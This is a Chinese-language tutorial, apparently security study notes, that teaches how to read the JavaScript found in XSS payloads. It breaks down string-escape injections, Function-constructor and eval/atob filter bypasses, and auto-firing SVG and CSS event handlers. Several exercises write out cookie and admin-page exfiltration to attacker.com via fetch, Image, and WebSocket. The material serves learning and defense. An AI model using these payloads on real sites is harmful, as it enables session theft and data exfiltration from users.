# JavaScript 阅读基础 -- 面向 XSS 的 JS 脚本阅读能力

> **前置：** 本文假设你已读过 [JavaScript for XSS](JavaScript%20for%20XSS.md)，熟悉 XSS 中的 JS API 和绕过技术。
> **目标：** 让你在阅读 XSS payload 和漏洞代码时，能像读 HTML 一样自然地解析 JavaScript 语法结构，而不是面对一串符号无从下手。

---

## 阅读 JS 的核心心态

你不学写 JS。你学的是**阅读 JS**。区别在于：

| 学写 JS | 学读 JS |
|---------|---------|
| 需要记住 API 名称和参数顺序 | 只需要认出"这是一个函数调用" |
| 需要知道最佳实践 | 只需要知道"这段代码想干什么" |
| 需要处理边界情况 | 只需要理解攻击者的意图 |

**本文只教你"看一眼就知道它在干什么"。**

---

## 第一章：一眼认出 JS 的基本结构

### 1.1 语句

JavaScript 由**语句**组成。一条语句就是一个"动作"。语句通常以分号 `;` 结尾（也可以省略，但 XSS payload 中常用 `;` 分隔多条语句）。

```
alert(1);                              // 一条语句：调用 alert 函数
var x = 1;                             // 一条语句：声明变量并赋值
document.body.innerHTML = '<h1>Hi</h1>'; // 一条语句：修改页面内容
```

当你看到分号 `;`，就知道一条完整的动作结束了。分号后面又是一个新的动作。

### 1.2 表达式 vs 语句

这是最重要的区分。**表达式产生值，语句执行动作。**

```
1 + 2           // 表达式：计算出一个值 3
alert(1)        // 表达式 + 语句：调用函数（产生返回值 undefined，同时执行弹窗动作）
x = 5           // 赋值表达式：把 5 赋给 x，同时表达式本身的值为 5
```

XSS payload 中最常见的模式是**把函数调用嵌入到表达式里**，利用表达式求值时必然执行函数的特性：

```
''-alert(1)-''   // alert(1) 是减法表达式的一部分，求值时必然调用
```

你不需要记住所有表达式的类型。只需要知道：**括号 `()` 前面通常是函数名，括号里面是参数。**

### 1.3 注释

```
// 单行注释：从 // 到行尾都被忽略
/* 多行注释：
   中间的内容全部被忽略 */
```

XSS 中 `//` 极其常用——攻击者用它"吞掉" payload 后面的残余代码，防止语法错误：

```
';alert(1)//   -->   // 后面的原始字符串残余被注释掉，不会报错
```

---

## 第二章：变量、值与类型

### 2.1 变量声明

```
var x = 1;      // 声明变量 x，赋值为数字 1
let y = 'hi';   // 声明变量 y，赋值为字符串 'hi'
const z = true; // 声明常量 z，赋值为布尔值 true
```

**阅读策略：** 看到 `var`/`let`/`const` 就知道在创建新变量。等号 `=` 是赋值。右边是值，左边是变量名。你不需要关心 `var` 和 `let` 的区别——这对阅读 XSS 不重要。

### 2.2 基本类型

JS 中你会遇到的值只有几种，认清楚就够了：

| 类型 | 样子 | 示例 |
|------|------|------|
| 数字 | 纯数字 | `1`, `0`, `3.14`, `NaN`（不是数字） |
| 字符串 | 被引号包裹 | `'hello'`, `"world"`, `` `template` `` |
| 布尔值 | 只有两个值 | `true`, `false` |
| 数组 | 方括号 | `[1, 2, 3]`, `[]`（空数组） |
| 对象 | 花括号 | `{name: 'alice', age: 30}`, `{}`（空对象） |
| undefined | 表示"没有值" | `undefined` |
| null | 表示"空" | `null` |

**阅读策略：** 看到引号 -> 字符串。看到方括号 -> 数组。看到花括号 -> 对象。不需要知道更细的分类。

### 2.3 字符串的三种引号

这是 XSS 中最容易混淆的地方，因为你经常需要在 payload 里嵌套引号。

```
'单引号字符串'            // 不能包含未转义的单引号
"双引号字符串"            // 不能包含未转义的双引号
`模板字面量（反引号）`      // 可以嵌入表达式 ${...}
```

**在 HTML 属性中**，你还要处理 HTML 的引号：

```
onclick="alert('XSS')"    // HTML 属性用双引号包裹，内部 JS 用单引号
onclick='alert("XSS")'    // HTML 属性用单引号包裹，内部 JS 用双引号
```

**阅读技巧：** 从外到内分层读。先找到 HTML 属性的边界（看 `=` 后面的引号），再找到 JS 字符串的边界（看 JS 代码内部的引号）。

### 2.4 字符串拼接

```
'a' + 'b'       // 结果：'ab'
'x' + 1         // 结果：'x1' （数字被自动转为字符串）
```

这在 XSS payload 中非常常见，用于绕过关键字过滤：

```
document['coo' + 'kie']   // 等价于 document.cookie，但绕过了 'cookie' 关键字检测
```

---

## 第三章：对象的点号 -- 最重要的 XSS 阅读技能

### 3.1 什么是对象

**对象 = 一堆属性的集合。** 属性有名字（键），每个名字对应一个值。

你不需要理解对象的内部实现。只需要知道这个访问模式：

```
对象.属性名          // 点号访问
对象['属性名']       // 方括号访问（属性名可以是动态拼接的字符串）
```

### 3.2 链式访问

JS 中你可以一路点下去：

```
document.body.innerHTML
```

从右往左读，还是从左往右读？两种读法各有价值：

**从左往右读（执行顺序）：**
```
document    → 整个网页文档
    .body   → 文档的 <body> 元素
    .innerHTML → body 的 HTML 内容
```

**从右往左读（归因）：**
```
                     .innerHTML → 我想获取 HTML 内容
               .body            → 从 body 元素上取
document                        → body 来自 document 对象
```

**练习：** 试着读这段 XSS payload：

```
document.querySelector('input[name="csrf"]').value
```

从左往右：
- `document` -- 整个网页
- `.querySelector('input[name="csrf"]')` -- 找到一个 CSS 选择器匹配的元素（name="csrf" 的 input）
- `.value` -- 取该元素的 value 属性（即 CSRF token 的值）

### 3.3 方括号访问：为什么 `window['alert'](1)` 也行

```
obj.prop    等价于    obj['prop']
```

方括号的优势是**属性名可以是变量或拼接的字符串**，而点号后面的名字是固定的：

```
// 以下四种写法完全等价
alert(1)
window.alert(1)
window['alert'](1)
this['ale' + 'rt'](1)      // 通过字符串拼接绕过关键字过滤
```

**阅读技巧：** 看到方括号内的字符串，把它翻译成点号形式来理解。`document['cookie']` 就是 `document.cookie`。

### 3.4 XSS 常见对象的快速索引

这里只列最核心的几个对象，完整版（13 个对象 + 每个属性/方法附 XSS 实例）见 **[JavaScript 内置对象速查](JavaScript%20内置对象速查.md)**。

| 对象 | 是什么 | 最常用的 3 个 |
|------|--------|-------------|
| `window` | 浏览器窗口（全局对象，可省略） | `alert()`, `fetch()`, `location` |
| `document` | 当前网页 | `cookie`, `querySelector()`, `body` |
| `location` | 当前页 URL | `href`, `search`, `hash` |
| `navigator` | 浏览器信息 | `sendBeacon()`, `clipboard`, `userAgent` |
| `element` | 任意 HTML 元素 | `innerHTML`, `value`, `getAttribute()` |

**阅读时如果遇到不认识的 `xxx.yyy()`，去速查文档搜 `xxx` 对象名即可。**

---

## 第四章：函数调用 -- XSS 的核心

### 4.1 函数调用的基本形式

```
函数名(参数1, 参数2, ...)
```

你在 XSS 中看到的最多的就是函数调用：

```
alert(1)                              // 调用 alert，参数是数字 1
fetch('https://attacker.com/steal')   // 调用 fetch，参数是字符串
document.querySelector('#main')       // 调用 querySelector 方法，参数是 CSS 选择器
```

**阅读策略：** 看到 `名字(...)` 就知道在调用一个函数。括号里面是输入的参数。如果名字前面有点号（`a.b()`），意思是这个函数是属于对象的（称为"方法"）。

### 4.2 函数调用的返回值

函数执行完后会返回一个值。返回什么不重要——重要的是**函数执行时产生的副作用**。

在 XSS 中，你调用 `alert()` 不是为了拿到它的返回值（`undefined`），而是为了**让弹窗出现**。这就是副作用。

```
fetch('https://attacker.com/', {method: 'POST', body: document.cookie})
// 返回值：一个 Promise 对象（不重要）
// 副作用：向攻击者服务器发送请求，携带 cookie
```

### 4.3 匿名函数与箭头函数

你不需要理解为什么有两种写法。认出来就行：

```
// 传统匿名函数
function() { alert(1); }
function(x) { return x + 1; }

// 箭头函数（ES6，更简洁）
() => { alert(1); }
x => { return x + 1; }
x => x + 1            // 单行时可以省略 {} 和 return
```

**阅读策略：** 看到 `=>` 就知道是箭头函数。`=>` 左边是参数（没有参数就是 `()`），右边是函数体。你在 XSS payload 的 `.then()` 和事件处理器中会经常遇到：

```
fetch('/api').then(r => r.text())
// r => r.text() 意思：接收参数 r，对它调用 .text() 方法并返回结果
```

### 4.4 回调函数：`.then()` 和 `setTimeout` 在干什么

**回调函数 = 不是马上执行的函数。** 你把它交给某个 API，等某个条件满足后，API 帮你调用它。

```
// setTimeout: 延迟执行
setTimeout(function() {
    fetch('https://attacker.com/?c=' + document.cookie);
}, 3000);
// 3 秒后执行那个匿名函数

// .then(): 等异步操作完成后执行
fetch('/api/user')
    .then(function(response) { return response.json(); })
    .then(function(data) { fetch('https://attacker.com/?d=' + data.name); });
// 第1步：发请求
// 第2步：等请求完成，把响应解析为 JSON
// 第3步：等解析完成，把数据发到攻击者服务器
```

**阅读策略：** `.then()` 链条从上往下读（按执行顺序）。每个 `.then()` 等待上一个步骤完成，然后执行自己的回调函数。

你也会见到这种写法（箭头函数缩写）：

```
fetch('/api')
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/?d=' + d.name));
```

效果完全一样，只是用 `=>` 缩写让代码更短。

---

## 第五章：XSS Payload 逐行拆解练习

### 5.1 经典 payload：`\';alert(1)//`

在 XSS 上下文中，这通常被注入到 JavaScript 字符串里：

```
var query = '用户输入';
```

攻击者输入 `\';alert(1)//` 后，变为：

```
var query = '\';alert(1)//';
```

逐字符阅读：

| 字符 | 含义 |
|------|------|
| `\` | 反斜杠。和后面的 `'` 组成 `\'`，是转义序列，表示一个字面量单引号字符 |
| `'` | 等等...这是攻击者的输入。如果服务器在 `'` 前又加了一个 `\`，就变成了 `\\'`... |

重新来。这是**绕过反斜杠转义的完整版**：

攻击者输入：`\';alert(1)//`
服务器在 `'` 前添加 `\`：`\\';alert(1)//`
最终 JS 代码：`var query = '\\';alert(1)//';`

| 片段 | JS 引擎解读 |
|------|-----------|
| `var query = '` | 变量赋值开始，字符串开启 |
| `\\` | 转义序列，表示一个字面量反斜杠 `\`（两个反斜杠消耗为一个） |
| `'` | 字符串终止符！因为前面的 `\` 已被 `\\` 消耗，这个引号恢复了功能 |
| `;` | 语句结束。`var query = '\';` 是一条完整语句 |
| `alert(1)` | 新的语句：调用 alert 函数，参数 1 |
| `;` | 语句结束 |
| `//` | 单行注释开始，后面的 `';` 全被忽略 |

**成功。** 攻击者的反斜杠"吃掉"了服务器的反斜杠，引号恢复了字符串终止能力。

### 5.2 `'-alert(1)-'`

这是不需要分号和注释的绕过方式，完全靠运算符。

输入后变为：

```
var query = ''-alert(1)-'';
```

逐片段阅读：

| 片段 | JS 引擎解读 |
|------|-----------|
| `var query = ` | 赋值开始 |
| `''` | 空字符串 |
| `-` | 减法运算符。JS 把空字符串转为数字 `0` |
| `alert(1)` | 函数调用。**必须执行**才能获取返回值用于后续减法。弹窗出现，返回 `undefined` |
| `-` | 减法运算符。`undefined` 转为数字 `NaN` |
| `''` | 空字符串，转为数字 `0` |
| `;` | 赋值结束。`var query = 0 - NaN - 0;` 即 `var query = NaN;` |

**成功。** 全程没有分号分隔语句，没有注释吞残余代码。减法表达式在求值时自然触发了 `alert()`。

### 5.3 `[].constructor.constructor('alert(1)')()`

这是 AngularJS 沙箱逃逸和 JSFuck 的核心技巧。

从右往左读还是乱？试试**逐层翻译法**：

```
[].constructor.constructor('alert(1)')()
```

**第一层：拆成两部分**

```
[].constructor.constructor('alert(1)')    // 这部分的结果是什么？
                                       ()   // 后面加 () 调用这个结果
```

**第二层：理解 `[].constructor.constructor('alert(1)')`**

```
[]                       // 空数组，typeof [] === 'object'
  .constructor           // 数组的构造函数 = Array（一个函数对象）
             .constructor // Array 的构造函数 = Function（所有函数对象的构造函数）
                           ('alert(1)')   // 调用 Function('alert(1)')，创建新函数
```

**第三层：拼起来**

```
Function('alert(1)')     // 创建一个函数体为 alert(1) 的新函数
                     ()  // 立即调用这个新函数
```

所以整个 payload 的意思就是：
1. 从空数组出发
2. 通过两次 `.constructor` 拿到 `Function` 构造函数
3. 用 `Function('alert(1)')` 创建一个新函数
4. 用 `()` 立即执行它

**你可以把这个模式当公式来记：** `<任意对象>.constructor.constructor('代码')()` = 执行任意代码。

变体都一样：

```
''.constructor.constructor('alert(1)')()      // 从空字符串出发
[].constructor.constructor('alert(1)')()      // 从空数组出发
{}.constructor.constructor('alert(1)')()      // 从空对象出发
```

### 5.4 `eval(atob('YWxlcnQoMSk='))`

```
atob('YWxlcnQoMSk=')     // atob = base64 解码 → 结果：'alert(1)'
eval('alert(1)')         // eval = 把字符串当作 JS 代码执行
```

两步走：先用 base64 把 payload 藏起来（绕过关键字检测），再用 eval 执行。

### 5.5 fetch 窃取链

```
fetch('/admin/users', { credentials: 'include' })
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)));
```

逐行翻译：

| 代码 | 翻译 |
|------|------|
| `fetch('/admin/users', {credentials: 'include'})` | 以登录用户的身份，向 `/admin/users` 发起 GET 请求 |
| `.then(r => r.text())` | 等请求完成后，把响应内容提取为纯文本 |
| `.then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)))` | 等文本提取完成后，把内容作为 URL 参数发送给攻击者服务器 |
| `encodeURIComponent(d)` | 对数据进行 URL 编码，确保特殊字符不会破坏 URL 结构 |

---

## 第六章：运算符速查 -- XSS 中会用到的

### 6.1 减法运算符的强制类型转换

这是 5.2 节用到的核心技术。JS 的减法运算符只用于数字，所以遇到字符串或函数时会**强制转为数字**：

```
Number('')       → 0      // 空字符串 → 0
Number(undefined) → NaN   // undefined → NaN
Number(true)     → 1      // true → 1
Number(false)    → 0      // false → 0
```

在转的过程中，如果要转换的是一个函数调用，JS **必须先执行函数获取返回值**，才能继续转换。这就是副作用的来源。

### 6.2 逗号运算符

```
a, b      // 先执行 a（丢弃结果），再执行 b（返回 b 的值）
```

XSS 中极少直接使用逗号运算符。但你要认得它，以防阅读代码时困惑。

### 6.3 逻辑运算符

```
&&   // "且"：左边为真才会执行右边
||   // "或"：左边为假才会执行右边
```

在 XSS 中偶尔用于条件判断。理解即可：

```
x && alert(1)      // 如果 x 为真，执行 alert(1)
!x || alert(1)     // 如果 x 为假，执行 alert(1)
```

---

## 第七章：jQuery 的快速阅读

你的 XSS 笔记中出现了大量 jQuery 代码。jQuery 的核心是 `$` 函数。

### 7.1 `$()` 能做什么

```
$('#backLink')              // 选取元素：找到 id="backLink" 的元素
$('<img src=x onerror=alert(1)>')  // 创建元素：如果字符串以 < 开头，创建新 DOM 元素
$(function() { ... })        // DOM 就绪：等页面加载完再执行函数
```

**阅读策略：** 看括号里是什么：
- 以 `#` `.` 或标签名开头 → 选择元素
- 以 `<` 开头 → 创建元素（**这是 XSS sink！**）
- 是一个 function → 绑定 DOM 就绪事件

### 7.2 jQuery 方法链

jQuery 的方法通常会返回 jQuery 对象本身，所以可以一直链下去。阅读时一步步来：

```
$('#backLink').attr("href", value)
// 第 1 步：找到 id="backLink" 的元素
// 第 2 步：设置其 href 属性为 value
```

```
$('section.blog-list h2:contains("' + hash + '")')
// 等价于 document.querySelectorAll('section.blog-list h2:contains(...)')
// :contains("xxx") 是 jQuery 扩展的选择器，查找包含指定文本的元素
```

### 7.3 jQuery 的 `$()` 为什么是 XSS sink

当 `$()` 的参数以 `<` 开头时，jQuery 会用 `innerHTML` 类似的方式创建元素：

```
$(location.hash)      // 如果 hash 是 #<img src=x onerror=alert(1)>...
// jQuery 看到 <img ...> ，会创建这个 HTML 元素
// 浏览器解析 <img> 时，src=x 加载失败，触发 onerror
```

**新版 jQuery** 已修复：仅当输入以 `<` 开头才创建元素。以 `#` 开头的只做选择器查询。

---

## 第八章：常见 JS 内置函数速查

在 XSS payload 中经常出现这些内置函数。不需要记住用法，知道它是干什么的就行：

| 函数 | 功能 | XSS 用途 |
|------|------|---------|
| `atob(str)` | Base64 解码 | 解码被隐藏的 payload |
| `btoa(str)` | Base64 编码 | 编码数据以便传输 |
| `encodeURIComponent(str)` | URL 编码 | 确保特殊字符不破坏 URL |
| `decodeURIComponent(str)` | URL 解码 | 解码被 URL 编码的数据 |
| `escape(str)` | 旧式 URL 编码（已废弃） | 在旧 payload 中偶尔见到 |
| `unescape(str)` | 旧式 URL 解码 | 同上 |
| `parseInt(str)` | 字符串转整数 | 数值计算 |
| `JSON.parse(str)` | JSON 字符串转 JS 对象 | 解析数据 |
| `JSON.stringify(obj)` | JS 对象转 JSON 字符串 | 序列化数据 |
| `String.fromCharCode(97,108,101,114,116)` | 从字符码创建字符串 | 绕过引号过滤（得到 "alert"） |

---

## 第九章：练习 -- 独立阅读以下 Payload

先试着自己读，再对照解析。

### 练习 1

```
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
```

解析：
1. `new Image()` -- 创建一个图片对象（不需要插入 DOM，浏览器就会发起 HTTP 请求）
2. `.src = ...` -- 设置图片的 src 属性为后面的 URL
3. `'https://attacker.com/?c=' + encodeURIComponent(document.cookie)` -- 拼接 URL
4. `document.cookie` -- 获取当前页面的 cookie
5. `encodeURIComponent(...)` -- URL 编码 cookie 值
6. 拼接后的 URL 类似：`https://attacker.com/?c=session%3Dabc123...`

当浏览器加载这个 `Image` 对象的 src 时，会自动发起 HTTP GET 请求。攻击者从服务器日志就能拿到 cookie。

### 练习 2

```
onerror=alert;throw 1
```

解析：
1. `onerror=alert` -- 将全局错误处理器设置为 `alert` 函数（不调用，只是赋值）
2. `;` -- 语句分隔
3. `throw 1` -- 抛出数字 1 作为异常

JS 异常处理机制：当 `throw 1` 执行时，浏览器调用 `onerror` 处理器，传入异常值（`1`）作为参数。所以最终效果等价于 `alert(1)`。

这个技巧的精妙之处在于：**全程没有使用括号 `()`**，绕过了括号过滤。

### 练习 3

```
<svg><animateTransform attributeName="transform" onbegin="alert(1)">
```

解析：
1. `<svg>` -- 创建一个 SVG 元素
2. `<animateTransform>` -- SVG 动画元素
3. `attributeName="transform"` -- 指定动画作用在 transform 属性上
4. `onbegin="alert(1)"` -- 当动画开始时触发 `alert(1)`

SVG 动画在页面加载后自动开始，`onbegin` 自动触发，无需用户交互。

### 练习 4

```
var ws = new WebSocket('wss://attacker.com/');
ws.onopen = function() { ws.send(document.cookie); };
```

解析：
1. `new WebSocket('wss://attacker.com/')` -- 创建一个到攻击者服务器的 WebSocket 连接
2. `ws.onopen = function() { ... }` -- 当连接成功打开时，执行后面的函数
3. `ws.send(document.cookie)` -- 通过 WebSocket 发送 cookie

### 练习 5

```
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">
```

解析：
1. `<style>@keyframes x{}</style>` -- 定义一个名为 `x` 的 CSS 动画（空动画即可）
2. `<div style="animation-name:x"` -- 给 div 应用名为 `x` 的动画
3. `onanimationstart="alert(1)"` -- 动画开始时触发 `alert(1)`

CSS 动画在页面渲染时自动开始，`onanimationstart` 自动触发。

---

## 第十章：Debug 阅读技巧

在实际靶场中遇到看不懂的 JS 代码时：

### 10.1 使用 Chrome DevTools Console

打开 Console（F12 → Console），把看不懂的表达式粘贴进去，看返回值：

```
> [].constructor
<- function Array() { [native code] }

> [].constructor.constructor
<- function Function() { [native code] }

> [].constructor.constructor('alert(1)')
<- function anonymous() { alert(1) }
```

这比死记硬背快得多。**实验是最好的学习方式。**

### 10.2 拆分法

遇到长链式表达式，从最左边开始，一部分一部分在 Console 里执行：

```
// 原始：document.querySelector('meta[name="csrf-token"]').getAttribute('content')

// 拆分：
> document.querySelector('meta[name="csrf-token"]')
<- <meta name="csrf-token" content="abc123">

> document.querySelector('meta[name="csrf-token"]').getAttribute('content')
<- "abc123"
```

### 10.3 typeof 检查类型

不确定某个东西是什么类型时：

```
> typeof []
<- "object"

> typeof alert
<- "function"

> typeof document.cookie
<- "string"
```

### 10.4 使用 Sources 面板加断点

1. F12 → Sources
2. 找到相关的 JS 文件
3. 在想观察的代码行号上点击加断点
4. 刷新页面，程序会在断点处暂停
5. 此时把鼠标悬停在变量上，可以看到变量的当前值

---

## 附录：XSS 常见 JS 模式速查卡

| 你看到的 | 它实际在做的 | 出现场景 |
|---------|------------|---------|
| `''-alert(1)-''` | 利用减法运算符触发函数调用 | 无分号/无注释的字符串逃逸 |
| `';alert(1)//` | 闭合字符串，执行代码，注释残余 | 标准字符串逃逸 |
| `\';alert(1)//` | 反斜杠消耗转义，闭合字符串 | 绕过反斜杠转义 |
| `[].constructor.constructor('code')()` | 获取 Function 构造函数执行代码 | 沙箱逃逸 / 关键字绕过 |
| `onerror=alert;throw 1` | 通过异常处理绕过括号过滤 | 无括号函数调用 |
| `&#97;&#108;&#101;&#114;&#116;` | HTML 实体编码的 "alert" | 绕过输入过滤 |
| `\x61\x6c\x65\x72\x74` | 十六进制转义的 "alert" | JS 字符串编码绕过 |
| `${alert(1)}` | 模板字面量表达式注入 | 注入点在反引号字符串中 |
| `new Image().src = url` | 发送 GET 请求（绕过 CORS） | 数据窃取 |
| `navigator.sendBeacon(url, data)` | 发送 POST 请求（最隐蔽） | 数据窃取 |
| `r => r.text()` | 箭头函数：接收响应，提取文本 | fetch 链式调用 |
| `$('...')` | jQuery 选择器（或元素创建） | jQuery DOM XSS |
| `eval(atob('...'))` | Base64 解码后执行 | 绕过关键字过滤 |

---

> **后续：** 本文配合 [JavaScript for XSS](JavaScript%20for%20XSS.md) 一起使用。前者告诉你 JS 在 XSS 中能做什么，本文告诉你如何读懂别人写的 JS payload 和漏洞代码。
